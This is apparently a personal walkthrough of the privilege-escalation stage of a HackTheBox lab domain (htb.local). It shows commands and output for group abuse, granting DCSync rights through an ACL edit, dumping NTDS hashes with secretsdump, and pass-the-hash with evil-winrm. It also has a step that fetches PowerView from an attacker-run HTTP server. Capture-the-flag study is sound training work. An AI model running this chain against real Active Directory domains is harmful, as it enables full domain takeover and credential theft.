|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.015625953674316406

```
## Privilege Escalation
1. My privileges
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
2. Groups
```
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```
3. No Kerberoastable users
```sh
impacket-GetUserSPNs -dc-ip forest.htb.local -dc-host forest.htb.local htb.local/svc-alfresco
```
Output:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
No entries found!
```
4. Bloodhound
	![[Pasted image 20260131112557.png]]
	- Alright interesting. We have `GenericAll` over `Exchange Windows Permissions`, so we can add ourselves into the group.
	- `Exchange Windows Permissions` has `WriteDACL` over the domain object, so we can have full control over the domain
5. Let's add ourselves to `Exchange Windows Permissions`
Download and transfer powerview
```sh
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1 
python3 -m http.server
```
Download the file and execute it
```powershell
iwr -Uri "http://10.10.16.26:8000/PowerView.ps1" -OutFile "C:\users\svc-alfresco\PowerView.ps1"
Import-Module .\PowerView.ps1
```
Then, add ourselves to the group. We need to use `-Credentials` because we are not in an interactive shell I think.
```powershell
$user1='htb\svc-alfresco'
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($user1, $SecPassword) 

$targetGroup='Exchange Windows Permissions'
$newUser='svc-alfresco'
Add-DomainGroupMember -Identity $targetGroup -Members $newUser -Credential $Cred -Verbose
```
Output:
```powershell
Get-DomainGroupMember -Identity "Exchange Windows Permissions" | Select MemberName

MemberName
----------
svc-alfresco
Exchange Trusted Subsystem
```
6. With [`WriteDacl`](https://bloodhound.specterops.io/resources/edges/write-dacl#abuse-info) privileges over the domain object, we can grant ourselves full control over the domain
```powershell
Add-DomainObjectAcl -TargetIdentity htb.local -Rights All
```
To verify,
```powershell
$sid=Get-DomainUser -Identity svc-alfresco | Select -ExpandProperty objectsid
# Get ACL
Get-ObjectAcl "DC=htb,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
- Does not work
7. But this one does: https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md
```powershell
$acl = get-acl "ad:DC=htb,DC=local"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
# rightsGuid for the extended right Ds-Replication-Get-Changes-All
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
# rightsGuid for the extended right Ds-Replication-Get-Changes
$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=htb,DC=local"
```
- Dunno why
8. To dump the creds,
```sh
impacket-secretsdump -outputfile htblocal_hashes -just-dc htb.local/svc-alfresco@10.129.191.98
```
Output:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
```
9. The administrator hash cannot be cracked.
```sh
hashcat -a 0 -m 1000 '32693b11e6aa90eb43d32c72a07ceea6' /usr/share/wordlists/rockyou.txt 
```
10. We can use pass-the-hash instead
```sh
evil-winrm -i 10.129.191.98 -u Administrator -H "32693b11e6aa90eb43d32c72a07ceea6"
```
Output:
```                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
- Yay
11. Get flag in administrator desktop.